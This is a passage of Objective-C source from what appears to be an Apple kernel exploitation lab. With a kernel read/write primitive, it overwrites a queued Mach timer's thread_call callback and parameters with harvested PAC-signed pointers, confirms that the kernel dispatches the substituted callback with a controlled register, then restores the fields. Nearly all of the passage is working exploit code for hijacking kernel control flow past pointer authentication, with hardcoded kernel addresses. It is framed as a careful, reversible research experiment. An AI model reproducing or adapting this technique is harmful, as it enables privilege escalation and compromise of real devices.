            BOOL exactAdapterSource = signedAdapterRead &&
                strippedAdapter == expectedAdapter &&
                signedAdapter != strippedAdapter;
            BOOL exactTargetSource = signedTargetRead &&
                strippedTarget == expectedTarget &&
                signedTarget != strippedTarget;
            BOOL exactReadOnlyTargetGates = gatesReadable &&
                gate == 0 && activation0 == 0 && activation1 == 0;

            report[@"pacReuseAdapterGlobal"] = CNDLabThreadCallHex(
                adapterGlobal);
            report[@"pacReuseRawAdapterObject"] = CNDLabThreadCallHex(
                rawAdapterObject);
            report[@"pacReuseAdapterObject"] = CNDLabThreadCallHex(
                adapterObject);
            report[@"pacReuseAdapterSigned"] = CNDLabThreadCallHex(
                signedAdapter);
            report[@"pacReuseAdapter"] = CNDLabThreadCallHex(
                strippedAdapter);
            report[@"pacReuseExpectedAdapter"] = CNDLabThreadCallHex(
                expectedAdapter);
            report[@"pacReuseTargetGlobal"] = CNDLabThreadCallHex(
                targetGlobal);
            report[@"pacReuseRawTargetObject"] = CNDLabThreadCallHex(
                rawTargetObject);
            report[@"pacReuseTargetObject"] = CNDLabThreadCallHex(
                targetObject);
            report[@"pacReuseTargetSigned"] = CNDLabThreadCallHex(
                signedTarget);
            report[@"pacReuseTarget"] = CNDLabThreadCallHex(
                strippedTarget);
            report[@"pacReuseExpectedTarget"] = CNDLabThreadCallHex(
                expectedTarget);
            report[@"pacReuseGateAddress"] = CNDLabThreadCallHex(
                gateAddress);
            report[@"pacReuseActivation0Address"] = CNDLabThreadCallHex(
                activation0Address);
            report[@"pacReuseActivation1Address"] = CNDLabThreadCallHex(
                activation1Address);
            report[@"pacReuseGate"] = @(gate);
            report[@"pacReuseActivation0"] = @(activation0);
            report[@"pacReuseActivation1"] = @(activation1);
            report[@"exactPACReuseAdapterSource"] = @(exactAdapterSource);
            report[@"exactPACReuseTargetSource"] = @(exactTargetSource);
            report[@"exactPACReuseReadOnlyTargetGates"] = @(
                exactReadOnlyTargetGates);
            report[@"pacReuseStaticProof"] = @{
                @"invokeHelper": @"0xfffffe0007b57e0c",
                @"registerMapping":
                    @"param0->x0, param1->x1, braa callback/0x73d8",
                @"adapter": @"0xfffffe00080a0710: braaz x1",
                @"adapterSourceGlobal": @"0xfffffe0009846d20",
                @"adapterSourceField": @"thread_call.func +0x58",
                @"target": @"0xfffffe0007e3613c",
                @"targetSourceGlobal": @"0xfffffe000983f988",
                @"targetSourceField": @"thread_call.param0 +0x60",
                @"targetBehavior":
                    @"ignores x0 and returns without writes when all three exact-build gate bytes are zero",
            };
            if (!exactAdapterSource || !exactTargetSource ||
                !exactReadOnlyTargetGates) {
                report[@"result"] = @"pac-reuse-source-validation-failed";
                report[@"message"] = @"A harvested signed pointer or the three-byte early-return target state did not match the exact-build proof; no timer was armed.";
                break;
            }

            uint64_t armDeadline = CNDLabThreadCallDeadlineAfterNanoseconds(
                CNDThreadCallDispatchDelayNanoseconds);
            uint64_t pollDeadline = CNDLabThreadCallDeadlineAfterNanoseconds(
                CNDThreadCallDispatchTimeoutNanoseconds);
            report[@"armDelayNanoseconds"] = @(
                CNDThreadCallDispatchDelayNanoseconds);
            report[@"dispatchTimeoutNanoseconds"] = @(
                CNDThreadCallDispatchTimeoutNanoseconds);
            report[@"armDeadline"] = CNDLabThreadCallHex(armDeadline);
            if (armDeadline == 0 || pollDeadline == 0) {
                report[@"result"] = @"timer-deadline-conversion-failed";
                report[@"message"] = @"mach timebase conversion failed before the PAC-reuse timer was armed.";
                break;
            }

            report[@"armAttempted"] = @YES;
            kern_return_t armKR = mk_timer_arm(timerPort, armDeadline);
            report[@"armKR"] = @(armKR);
            if (armKR != KERN_SUCCESS) {
                report[@"result"] = @"timer-arm-failed";
                report[@"message"] = @"mk_timer_arm refused the ordinary PAC-reuse timer.";
                break;
            }
            report[@"armedTimer"] = @YES;
            timerMayBeArmed = YES;

            uint64_t queuedObservationDeadline =
                CNDLabThreadCallDeadlineAfterNanoseconds(
                    UINT64_C(250000000));
            BOOL exactQueuedState = NO;
            uint64_t queuedTCQueue = 0;
            uint64_t queuedSignedCallback = 0;
            uint64_t queuedParam0 = 0;
            uint64_t queuedParam1 = 0;
            uint64_t queuedSchedulerState0 = schedulerState0;
            uint64_t queuedSchedulerState1 = schedulerState1;
            uint8_t queuedIsArmed = 0;
            uint32_t queuedActive = 0;
            do {
                uint8_t queued[CNDMkTimerObservedSize] = {0};
                if (cnd_lab_krw_read(
                        timerObject, queued, sizeof(queued))) {
                    queuedTCQueue = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerTCQueueOffset);
                    queuedSignedCallback = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerCallbackOffset);
                    queuedParam0 = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerParam0Offset);
                    queuedParam1 = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerParam1Offset);
                    queuedSchedulerState0 = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerSchedulerState0Offset);
                    queuedSchedulerState1 = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerSchedulerState1Offset);
                    queuedIsArmed = queued[CNDMkTimerIsArmedOffset];
                    queuedActive = CNDLabThreadCallRead32(
                        queued, (size_t)CNDMkTimerActiveOffset);
                    exactQueuedState = queuedTCQueue != 0 &&
                        queuedSignedCallback == signedCallback &&
                        queuedParam0 == param0 && queuedParam1 == 0 &&
                        queuedSchedulerState0 == schedulerState0 + 1 &&
                        queuedSchedulerState1 == schedulerState1 &&
                        queuedIsArmed == 1 && queuedActive == 1;
                    if (exactQueuedState) break;
                }
                usleep(CNDThreadCallDispatchPollMicroseconds);
            } while (queuedObservationDeadline != 0 &&
                mach_absolute_time() < queuedObservationDeadline);
            report[@"queuedTCQueue"] = CNDLabThreadCallHex(queuedTCQueue);
            report[@"queuedSignedCallback"] = CNDLabThreadCallHex(
                queuedSignedCallback);
            report[@"queuedParam0"] = CNDLabThreadCallHex(queuedParam0);
            report[@"queuedParam1"] = CNDLabThreadCallHex(queuedParam1);
            report[@"queuedSchedulerState0"] = @(
                queuedSchedulerState0);
            report[@"queuedSchedulerState1"] = @(
                queuedSchedulerState1);
            report[@"queuedIsArmed"] = @(queuedIsArmed);
            report[@"queuedActive"] = @(queuedActive);
            report[@"exactQueuedState"] = @(exactQueuedState);
            if (!exactQueuedState) {
                report[@"result"] = @"queued-thread-call-validation-failed";
                report[@"message"] = @"mk_timer_arm did not expose the exact queued timer state required for the PAC-reuse transplant.";
                break;
            }

            pacReuseCallbackAddress =
                timerObject + CNDMkTimerCallbackOffset;
            pacReuseParam0Address = timerObject + CNDMkTimerParam0Offset;
            pacReuseParam1Address = timerObject + CNDMkTimerParam1Offset;
            pacReuseOriginalCallback = signedCallback;
            pacReuseOriginalParam0 = param0;
            pacReuseOriginalParam1 = param1;
            report[@"pacReuseCallbackAddress"] = CNDLabThreadCallHex(
                pacReuseCallbackAddress);
            report[@"pacReuseParam0Address"] = CNDLabThreadCallHex(
                pacReuseParam0Address);
            report[@"pacReuseParam1Address"] = CNDLabThreadCallHex(
                pacReuseParam1Address);
            report[@"pacReuseX0Canary"] = CNDLabThreadCallHex(
                CNDThreadCallPACReuseX0Canary);
            report[@"usedKernelWrite"] = @YES;
            report[@"pacReuseTransplantAttempted"] = @YES;

            BOOL targetWriteSucceeded = cnd_lab_krw_write(
                pacReuseParam1Address, &signedTarget,
                sizeof(signedTarget));
            if (targetWriteSucceeded) pacReuseFieldsOutstanding = YES;
            BOOL adapterWriteSucceeded = targetWriteSucceeded &&
                cnd_lab_krw_write(
                    pacReuseCallbackAddress, &signedAdapter,
                    sizeof(signedAdapter));
            BOOL canaryWriteSucceeded = adapterWriteSucceeded &&
                cnd_lab_krw_write(
                    pacReuseParam0Address,
                    &CNDThreadCallPACReuseX0Canary,
                    sizeof(CNDThreadCallPACReuseX0Canary));
            report[@"pacReuseTargetWriteSucceeded"] = @(
                targetWriteSucceeded);
            report[@"pacReuseAdapterWriteSucceeded"] = @(
                adapterWriteSucceeded);
            report[@"pacReuseCanaryWriteSucceeded"] = @(
                canaryWriteSucceeded);

            uint64_t transplantedCallback = 0;
            uint64_t transplantedParam0 = 0;
            uint64_t transplantedParam1 = 0;
            BOOL transplantReadSucceeded = canaryWriteSucceeded &&
                cnd_lab_krw_read(
                    pacReuseCallbackAddress, &transplantedCallback,
                    sizeof(transplantedCallback)) &&
                cnd_lab_krw_read(
                    pacReuseParam0Address, &transplantedParam0,
                    sizeof(transplantedParam0)) &&
                cnd_lab_krw_read(
                    pacReuseParam1Address, &transplantedParam1,
                    sizeof(transplantedParam1));
            BOOL transplantVerified = transplantReadSucceeded &&
                transplantedCallback == signedAdapter &&
                transplantedParam0 == CNDThreadCallPACReuseX0Canary &&
                transplantedParam1 == signedTarget;
            report[@"pacReuseTransplantedCallback"] = CNDLabThreadCallHex(
                transplantedCallback);
            report[@"pacReuseTransplantedParam0"] = CNDLabThreadCallHex(
                transplantedParam0);
            report[@"pacReuseTransplantedParam1"] = CNDLabThreadCallHex(
                transplantedParam1);
            report[@"pacReuseTransplantVerified"] = @(transplantVerified);
            if (!transplantVerified) {
                report[@"result"] = @"pac-reuse-transplant-failed";
                report[@"message"] = @"The ordered target/adapter/x0 transplant did not read back exactly; cancellation and restoration will run.";
                break;
            }

            BOOL queueDrainObservationReadable = NO;
            BOOL transplantedFieldsStable = YES;
            uint32_t drainPollCount = 0;
            uint64_t postDispatchTCQueue = queuedTCQueue;
            while (mach_absolute_time() < pollDeadline) {
                uint8_t observation[CNDMkTimerObservedSize] = {0};
                drainPollCount++;
                if (!cnd_lab_krw_read(
                        timerObject, observation, sizeof(observation))) {
                    usleep(CNDThreadCallDispatchPollMicroseconds);
                    continue;
                }
                queueDrainObservationReadable = YES;
                postDispatchTCQueue = CNDLabThreadCallRead64(
                    observation, (size_t)CNDMkTimerTCQueueOffset);
                transplantedFieldsStable =
                    CNDLabThreadCallRead64(
                        observation,
                        (size_t)CNDMkTimerCallbackOffset) ==
                            signedAdapter &&
                    CNDLabThreadCallRead64(
                        observation, (size_t)CNDMkTimerParam0Offset) ==
                            CNDThreadCallPACReuseX0Canary &&
                    CNDLabThreadCallRead64(
                        observation, (size_t)CNDMkTimerParam1Offset) ==
                            signedTarget;
                if (!transplantedFieldsStable || postDispatchTCQueue == 0) {
                    break;
                }
                usleep(CNDThreadCallDispatchPollMicroseconds);
            }
            pacReuseQueueDrained = queueDrainObservationReadable &&
                postDispatchTCQueue == 0;
            if (pacReuseQueueDrained) {
                usleep(CNDThreadCallPACReuseSettleMicroseconds);
            }

            uint8_t settled[CNDMkTimerObservedSize] = {0};
            uint8_t settledGate = UINT8_MAX;
            uint8_t settledActivation0 = UINT8_MAX;
            uint8_t settledActivation1 = UINT8_MAX;
            BOOL settledReadSucceeded = pacReuseQueueDrained &&
                cnd_lab_krw_read(timerObject, settled, sizeof(settled)) &&
                cnd_lab_krw_read(
                    gateAddress, &settledGate, sizeof(settledGate)) &&
                cnd_lab_krw_read(
                    activation0Address, &settledActivation0,
                    sizeof(settledActivation0)) &&
                cnd_lab_krw_read(
                    activation1Address, &settledActivation1,
                    sizeof(settledActivation1));
            uint64_t settledTCQueue = settledReadSucceeded
                ? CNDLabThreadCallRead64(
                    settled, (size_t)CNDMkTimerTCQueueOffset) : UINT64_MAX;
            uint8_t settledIsArmed = settledReadSucceeded
                ? settled[CNDMkTimerIsArmedOffset] : UINT8_MAX;
            uint32_t settledActive = settledReadSucceeded
                ? CNDLabThreadCallRead32(
                    settled, (size_t)CNDMkTimerActiveOffset) : UINT32_MAX;
            BOOL settledFieldsStable = settledReadSucceeded &&
                CNDLabThreadCallRead64(
                    settled, (size_t)CNDMkTimerCallbackOffset) ==
                        signedAdapter &&
                CNDLabThreadCallRead64(
                    settled, (size_t)CNDMkTimerParam0Offset) ==
                        CNDThreadCallPACReuseX0Canary &&
                CNDLabThreadCallRead64(
                    settled, (size_t)CNDMkTimerParam1Offset) ==
                        signedTarget;
            BOOL settledGatesStable = settledReadSucceeded &&
                settledGate == 0 && settledActivation0 == 0 &&
                settledActivation1 == 0;
            BOOL dispatchCompleted = pacReuseQueueDrained &&
                settledTCQueue == 0 && settledIsArmed == 1 &&
                settledActive == 1 && transplantedFieldsStable &&
                settledFieldsStable && settledGatesStable;
            report[@"pacReuseDrainPollCount"] = @(drainPollCount);
            report[@"pacReusePostDispatchTCQueue"] = CNDLabThreadCallHex(
                postDispatchTCQueue);
            report[@"pacReuseQueueDrained"] = @(pacReuseQueueDrained);
            report[@"pacReuseSettledTCQueue"] = CNDLabThreadCallHex(
                settledTCQueue);
            report[@"pacReuseSettledIsArmed"] = @(settledIsArmed);
            report[@"pacReuseSettledActive"] = @(settledActive);
            report[@"pacReuseSettledGate"] = @(settledGate);
            report[@"pacReuseSettledActivation0"] = @(
                settledActivation0);
            report[@"pacReuseSettledActivation1"] = @(
                settledActivation1);
            report[@"pacReuseTransplantedFieldsStable"] = @(
                transplantedFieldsStable && settledFieldsStable);
            report[@"pacReuseReadOnlyTargetGatesStable"] = @(
                settledGatesStable);
            report[@"callbackDispatched"] = @(pacReuseQueueDrained);
            report[@"callbackCompleted"] = @(dispatchCompleted);
            if (!dispatchCompleted) {
                report[@"result"] = @"pac-reuse-dispatch-observation-failed";
                report[@"message"] = @"The queued call did not drain into the stable early-return state; cancellation and restoration will run.";
                break;
            }

            BOOL restoreTargetSucceeded = cnd_lab_krw_write(
                pacReuseParam1Address, &pacReuseOriginalParam1,
                sizeof(pacReuseOriginalParam1));
            BOOL restoreCallbackSucceeded = restoreTargetSucceeded &&
                cnd_lab_krw_write(
                    pacReuseCallbackAddress, &pacReuseOriginalCallback,
                    sizeof(pacReuseOriginalCallback));
            BOOL restoreParam0Succeeded = restoreCallbackSucceeded &&
                cnd_lab_krw_write(
                    pacReuseParam0Address, &pacReuseOriginalParam0,
                    sizeof(pacReuseOriginalParam0));
            uint64_t restoredCallback = 0;
            uint64_t restoredParam0 = 0;
            uint64_t restoredParam1 = 0;
            BOOL restoreReadSucceeded = restoreParam0Succeeded &&
                cnd_lab_krw_read(
                    pacReuseCallbackAddress, &restoredCallback,
                    sizeof(restoredCallback)) &&
                cnd_lab_krw_read(
                    pacReuseParam0Address, &restoredParam0,
                    sizeof(restoredParam0)) &&
                cnd_lab_krw_read(
                    pacReuseParam1Address, &restoredParam1,
                    sizeof(restoredParam1));
            BOOL pacReuseFieldsRestored = restoreReadSucceeded &&
                restoredCallback == pacReuseOriginalCallback &&
                restoredParam0 == pacReuseOriginalParam0 &&
                restoredParam1 == pacReuseOriginalParam1;
            report[@"pacReuseRestoreTargetSucceeded"] = @(
                restoreTargetSucceeded);
            report[@"pacReuseRestoreCallbackSucceeded"] = @(
                restoreCallbackSucceeded);
            report[@"pacReuseRestoreParam0Succeeded"] = @(
                restoreParam0Succeeded);
            report[@"pacReuseRestoredCallback"] = CNDLabThreadCallHex(
                restoredCallback);
            report[@"pacReuseRestoredParam0"] = CNDLabThreadCallHex(
                restoredParam0);
            report[@"pacReuseRestoredParam1"] = CNDLabThreadCallHex(
                restoredParam1);
            report[@"pacReuseFieldsRestored"] = @(
                pacReuseFieldsRestored);
            pacReuseFieldsOutstanding = !pacReuseFieldsRestored;
            if (!pacReuseFieldsRestored) {
                report[@"result"] = @"pac-reuse-field-restore-failed";
                report[@"message"] = @"The original callback/param0/param1 triple was not restored exactly; emergency cleanup will retry.";
                break;
            }

            uint64_t cancelledDeadline = 0;
            report[@"pacReuseCancelAttempted"] = @YES;
            kern_return_t cancelKR = mk_timer_cancel(
                timerPort, &cancelledDeadline);
            report[@"pacReuseCancelKR"] = @(cancelKR);
            report[@"pacReuseCancelledDeadline"] = CNDLabThreadCallHex(
                cancelledDeadline);
            uint8_t cancelled[CNDMkTimerObservedSize] = {0};
            BOOL cancelledReadSucceeded = cnd_lab_krw_read(
                timerObject, cancelled, sizeof(cancelled));
            uint64_t cancelledTCQueue = cancelledReadSucceeded
                ? CNDLabThreadCallRead64(
                    cancelled, (size_t)CNDMkTimerTCQueueOffset) : UINT64_MAX;
            uint8_t cancelledIsArmed = cancelledReadSucceeded
                ? cancelled[CNDMkTimerIsArmedOffset] : UINT8_MAX;
            uint32_t cancelledActive = cancelledReadSucceeded
                ? CNDLabThreadCallRead32(
                    cancelled, (size_t)CNDMkTimerActiveOffset) : UINT32_MAX;
            BOOL exactPostDispatchOwnerState =
                cancelKR == KERN_SUCCESS && cancelledReadSucceeded &&
                cancelledTCQueue == 0 && cancelledIsArmed == 0 &&
                cancelledActive == 1;
            report[@"pacReusePostCancelTCQueue"] = CNDLabThreadCallHex(
                cancelledTCQueue);
            report[@"pacReusePostCancelIsArmed"] = @(cancelledIsArmed);
            report[@"pacReusePostCancelActive"] = @(cancelledActive);
            report[@"pacReuseExactPostDispatchOwnerState"] = @(
                exactPostDispatchOwnerState);
            if (!exactPostDispatchOwnerState) {
                report[@"result"] = @"pac-reuse-owner-state-mismatch";
                report[@"message"] = @"The completed substitute callback did not leave the exact cancel-cleared is_armed/active=1 owner state; emergency cleanup will inspect it.";
                break;
            }

            uint32_t repairedActive = 0;
            BOOL ownerRepairWriteSucceeded = cnd_lab_krw_write(
                timerObject + CNDMkTimerActiveOffset,
                &repairedActive, sizeof(repairedActive));
            uint8_t repaired[CNDMkTimerObservedSize] = {0};
            BOOL ownerRepairReadSucceeded = ownerRepairWriteSucceeded &&
                cnd_lab_krw_read(timerObject, repaired, sizeof(repaired));
            BOOL ownerStateRepaired = ownerRepairReadSucceeded &&
                CNDLabThreadCallRead64(
                    repaired, (size_t)CNDMkTimerTCQueueOffset) == 0 &&
                repaired[CNDMkTimerIsArmedOffset] == 0 &&
                CNDLabThreadCallRead32(
                    repaired, (size_t)CNDMkTimerActiveOffset) == 0 &&
                CNDLabThreadCallRead64(
                    repaired, (size_t)CNDMkTimerCallbackOffset) ==
                        pacReuseOriginalCallback &&
                CNDLabThreadCallRead64(
                    repaired, (size_t)CNDMkTimerParam0Offset) ==
                        pacReuseOriginalParam0 &&
                CNDLabThreadCallRead64(
                    repaired, (size_t)CNDMkTimerParam1Offset) ==
                        pacReuseOriginalParam1;
            report[@"pacReuseOwnerRepairWriteSucceeded"] = @(
                ownerRepairWriteSucceeded);
            report[@"pacReuseOwnerStateRepaired"] = @(ownerStateRepaired);
            if (!ownerStateRepaired) {
                report[@"result"] = @"pac-reuse-owner-state-repair-failed";
                report[@"message"] = @"The unsigned Mach-timer active count did not repair to the exact destroyable state.";
                break;
            }

            timerMayBeArmed = NO;
            report[@"timerQuiescedAfterDispatch"] = @YES;
            report[@"exactReversibleMutation"] = @YES;
            report[@"exactPACReuseDispatch"] = @YES;
            report[@"result"] = @"exact-two-stage-pac-reuse-dispatch-observed";
            report[@"message"] = @"Dispatched the harvested IA-zero early-return target through the harvested IA/0x73d8 braaz adapter with controlled x0, then restored all signed and unsigned fields and repaired the timer owner state without kcall.";
            break;
        }

        if (!reversibleMutation || !exactBoundary) break;

        mutationAddress = timerObject + CNDMkTimerParam1Offset;
        mutationOriginalValue = param1;
        report[@"mutationField"] = @"thread_call.param1";
        report[@"mutationAddress"] = CNDLabThreadCallHex(mutationAddress);
        report[@"mutationCanary"] = CNDLabThreadCallHex(
            CNDThreadCallParam1MutationCanary);
        report[@"mutationOriginalValue"] = CNDLabThreadCallHex(
            mutationOriginalValue);
        report[@"mutationAttempted"] = @YES;
        report[@"usedKernelWrite"] = @YES;

        BOOL mutationWriteSucceeded = cnd_lab_krw_write(
            mutationAddress, &CNDThreadCallParam1MutationCanary,
            sizeof(CNDThreadCallParam1MutationCanary));
        report[@"mutationWriteSucceeded"] = @(mutationWriteSucceeded);
        if (!mutationWriteSucceeded) {
            report[@"result"] = @"param1-mutation-write-failed";
            report[@"message"] = @"The VM provider refused the bounded param1 canary write; no dispatch was attempted.";
            break;
        }
        mutationOutstanding = YES;

        uint64_t mutationReadback = 0;
        BOOL mutationReadSucceeded = cnd_lab_krw_read(
            mutationAddress, &mutationReadback, sizeof(mutationReadback));
        BOOL mutationReadbackVerified = mutationReadSucceeded &&
            mutationReadback == CNDThreadCallParam1MutationCanary;
        report[@"mutationReadSucceeded"] = @(mutationReadSucceeded);
        report[@"mutationReadback"] = CNDLabThreadCallHex(
            mutationReadback);
        report[@"mutationReadbackVerified"] = @(
            mutationReadbackVerified);
        if (!mutationReadbackVerified) {
            report[@"result"] = @"param1-mutation-readback-failed";
            report[@"message"] = @"The canary write did not read back exactly; restoration will be attempted before timer destruction.";
            break;
        }

        if (dispatchOriginalCallback) {
            report[@"dispatchStaticProof"] = @{
                @"invokeHelper": @"0xfffffe0007b57e0c",
                @"invokeEvidence": @"ev_488b8489a924956c168ae9a89a0719c133d4f8444f93dfd12e20f167fbe0cc6d",
                @"registerMapping": @"param0->x0, param1->x1, braa callback/0x73d8",
                @"callbackEntry": @"0xfffffe0007b19bb4",
                @"callbackIncomingX1Read": @NO,
                @"armEntry": @"0xfffffe0007b1a10c",
                @"armQueuedCallSite": @"0xfffffe0007b1a33c",
                @"armQueuedParam1": @"x1 = 0 at 0xfffffe0007b1a328",
            };
            uint64_t armDeadline = CNDLabThreadCallDeadlineAfterNanoseconds(
                CNDThreadCallDispatchDelayNanoseconds);
            uint64_t pollDeadline = CNDLabThreadCallDeadlineAfterNanoseconds(
                CNDThreadCallDispatchTimeoutNanoseconds);
            report[@"armDelayNanoseconds"] = @(
                CNDThreadCallDispatchDelayNanoseconds);
            report[@"dispatchTimeoutNanoseconds"] = @(
                CNDThreadCallDispatchTimeoutNanoseconds);
            report[@"armDeadline"] = CNDLabThreadCallHex(armDeadline);
            if (armDeadline == 0 || pollDeadline == 0) {
                report[@"result"] = @"timer-deadline-conversion-failed";
                report[@"message"] = @"mach timebase conversion failed before the timer was armed.";
                break;
            }

            report[@"armAttempted"] = @YES;
            kern_return_t armKR = mk_timer_arm(timerPort, armDeadline);
            report[@"armKR"] = @(armKR);
            if (armKR != KERN_SUCCESS) {
                report[@"result"] = @"timer-arm-failed";
                report[@"message"] = @"mk_timer_arm refused the ordinary timer; the canary will be restored without dispatch.";
                break;
            }
            report[@"armedTimer"] = @YES;
            timerMayBeArmed = YES;

            uint64_t queuedObservationDeadline =
                CNDLabThreadCallDeadlineAfterNanoseconds(
                    UINT64_C(250000000));
            BOOL queuedObservationReadable = NO;
            BOOL exactQueuedState = NO;
            uint64_t queuedSignedCallback = 0;
            uint64_t queuedParam0 = 0;
            uint64_t queuedParam1 = 0;
            uint64_t queuedSchedulerState0 = schedulerState0;
            uint64_t queuedSchedulerState1 = schedulerState1;
            uint8_t queuedIsArmed = 0;
            uint32_t queuedActive = 0;
            do {
                uint8_t queued[CNDMkTimerObservedSize] = {0};
                if (cnd_lab_krw_read(
                        timerObject, queued, sizeof(queued))) {
                    queuedObservationReadable = YES;
                    queuedSignedCallback = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerCallbackOffset);
                    queuedParam0 = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerParam0Offset);
                    queuedParam1 = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerParam1Offset);
                    queuedSchedulerState0 = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerSchedulerState0Offset);
                    queuedSchedulerState1 = CNDLabThreadCallRead64(
                        queued, (size_t)CNDMkTimerSchedulerState1Offset);
                    queuedIsArmed = queued[CNDMkTimerIsArmedOffset];
                    queuedActive = CNDLabThreadCallRead32(
                        queued, (size_t)CNDMkTimerActiveOffset);
                    exactQueuedState =
                        queuedSignedCallback == signedCallback &&
                        queuedParam0 == param0 &&
                        queuedParam1 == mutationOriginalValue &&
                        queuedSchedulerState0 == schedulerState0 + 1 &&
                        queuedSchedulerState1 == schedulerState1 &&
                        queuedIsArmed == 1 && queuedActive == 1;
                    if (exactQueuedState) break;
                }
                usleep(CNDThreadCallDispatchPollMicroseconds);
            } while (queuedObservationDeadline != 0 &&
                mach_absolute_time() < queuedObservationDeadline);
            report[@"queuedObservationReadable"] = @(
                queuedObservationReadable);
            report[@"queuedSignedCallback"] = CNDLabThreadCallHex(
                queuedSignedCallback);
            report[@"queuedParam0"] = CNDLabThreadCallHex(queuedParam0);
            report[@"queuedParam1"] = CNDLabThreadCallHex(queuedParam1);
            report[@"queuedSchedulerState0"] = @(
                queuedSchedulerState0);
            report[@"queuedSchedulerState1"] = @(
                queuedSchedulerState1);
            report[@"queuedIsArmed"] = @(queuedIsArmed);
            report[@"queuedActive"] = @(queuedActive);
            report[@"armNormalizedParam1"] = @(
                queuedParam1 == mutationOriginalValue);
            report[@"preArmCanaryOverwrittenByArm"] = @(
                queuedParam1 != CNDThreadCallParam1MutationCanary);
            report[@"exactQueuedState"] = @(exactQueuedState);
            if (!exactQueuedState) {
                report[@"result"] = @"queued-thread-call-validation-failed";
                report[@"message"] = @"mk_timer_arm did not produce the exact observed scheduler-state transition with an armed, active timer and its documented zero param1; cancellation and restoration will run.";
                break;
            }

            report[@"queuedMutationAttempted"] = @YES;
            BOOL queuedMutationWriteSucceeded = cnd_lab_krw_write(
                mutationAddress, &CNDThreadCallParam1MutationCanary,
                sizeof(CNDThreadCallParam1MutationCanary));
            report[@"queuedMutationWriteSucceeded"] = @(
                queuedMutationWriteSucceeded);
            uint64_t queuedMutationReadback = 0;
            BOOL queuedMutationReadSucceeded =
                queuedMutationWriteSucceeded && cnd_lab_krw_read(
                    mutationAddress, &queuedMutationReadback,
                    sizeof(queuedMutationReadback));
            BOOL queuedMutationReadbackVerified =
                queuedMutationReadSucceeded &&
                queuedMutationReadback == CNDThreadCallParam1MutationCanary;
            report[@"queuedMutationReadSucceeded"] = @(
                queuedMutationReadSucceeded);
            report[@"queuedMutationReadback"] = CNDLabThreadCallHex(
                queuedMutationReadback);
            report[@"queuedMutationReadbackVerified"] = @(
                queuedMutationReadbackVerified);
            if (!queuedMutationReadbackVerified) {
                report[@"result"] = @"queued-param1-mutation-failed";
                report[@"message"] = @"The fixed canary was not verified in the already-queued thread_call; cancellation and restoration will run before destruction.";
                break;
            }

            BOOL observationReadable = NO;
            BOOL callbackIdentityStable = YES;
            BOOL param0Stable = YES;
            BOOL canaryStable = YES;
            BOOL callbackQuiesced = NO;
            uint32_t pollCount = 0;
            uint64_t finalSchedulerState0 = schedulerState0;
            uint64_t finalSchedulerState1 = schedulerState1;
            uint8_t finalIsArmed = 1;
            uint32_t finalActive = UINT32_MAX;
            while (mach_absolute_time() < pollDeadline) {
                uint8_t observation[CNDMkTimerObservedSize] = {0};
                pollCount++;
                if (!cnd_lab_krw_read(
                        timerObject, observation, sizeof(observation))) {
                    usleep(CNDThreadCallDispatchPollMicroseconds);
                    continue;
                }
                observationReadable = YES;
                uint64_t observedSignedCallback = CNDLabThreadCallRead64(
                    observation, (size_t)CNDMkTimerCallbackOffset);
                uint64_t observedParam0 = CNDLabThreadCallRead64(
                    observation, (size_t)CNDMkTimerParam0Offset);
                uint64_t observedParam1 = CNDLabThreadCallRead64(
                    observation, (size_t)CNDMkTimerParam1Offset);
                finalSchedulerState0 = CNDLabThreadCallRead64(
                    observation,
                    (size_t)CNDMkTimerSchedulerState0Offset);
                finalSchedulerState1 = CNDLabThreadCallRead64(
                    observation,
                    (size_t)CNDMkTimerSchedulerState1Offset);
                finalIsArmed = observation[CNDMkTimerIsArmedOffset];
                finalActive = CNDLabThreadCallRead32(
                    observation, (size_t)CNDMkTimerActiveOffset);
                callbackIdentityStable = callbackIdentityStable &&
                    observedSignedCallback == signedCallback;
                param0Stable = param0Stable && observedParam0 == param0;
                canaryStable = canaryStable &&
                    observedParam1 == CNDThreadCallParam1MutationCanary;
                callbackQuiesced = finalIsArmed == 0 && finalActive == 0;
                if (!callbackIdentityStable || !param0Stable ||
                    !canaryStable || callbackQuiesced) break;
                usleep(CNDThreadCallDispatchPollMicroseconds);
            }
            if (observationReadable && callbackQuiesced) {
                timerMayBeArmed = NO;
            }

            CNDLabTimerExpirationMessage expirationMessage = {0};
            mach_msg_return_t expirationMessageKR = MACH_RCV_TIMED_OUT;
            if (callbackQuiesced) {
                expirationMessageKR = mach_msg(
                    &expirationMessage.header,
                    MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                    0, (mach_msg_size_t)sizeof(expirationMessage),
                    timerPort, 500, MACH_PORT_NULL);
            }
            BOOL expirationMessageReceived =
                expirationMessageKR == MACH_MSG_SUCCESS;

            uint8_t postMessageObservation[CNDMkTimerObservedSize] = {0};
            BOOL postMessageReadSucceeded = expirationMessageReceived &&
                cnd_lab_krw_read(timerObject, postMessageObservation,
                    sizeof(postMessageObservation));
            if (postMessageReadSucceeded) {
                callbackIdentityStable = callbackIdentityStable &&
                    CNDLabThreadCallRead64(postMessageObservation,
                        (size_t)CNDMkTimerCallbackOffset) == signedCallback;
                param0Stable = param0Stable &&
                    CNDLabThreadCallRead64(postMessageObservation,
                        (size_t)CNDMkTimerParam0Offset) == param0;
                canaryStable = canaryStable &&
                    CNDLabThreadCallRead64(postMessageObservation,
                        (size_t)CNDMkTimerParam1Offset) ==
                        CNDThreadCallParam1MutationCanary;
            }
            BOOL callbackDispatched = expirationMessageReceived;
            BOOL callbackCompleted = expirationMessageReceived &&
                callbackQuiesced && postMessageReadSucceeded;
            report[@"dispatchPollCount"] = @(pollCount);
            report[@"callbackIdentityStable"] = @(callbackIdentityStable);
            report[@"param0StableThroughDispatch"] = @(param0Stable);
            report[@"param1CanaryStableThroughDispatch"] = @(canaryStable);
            report[@"postDispatchSchedulerState0"] = @(
                finalSchedulerState0);
            report[@"postDispatchSchedulerState1"] = @(
                finalSchedulerState1);
            report[@"postDispatchIsArmed"] = @(finalIsArmed);
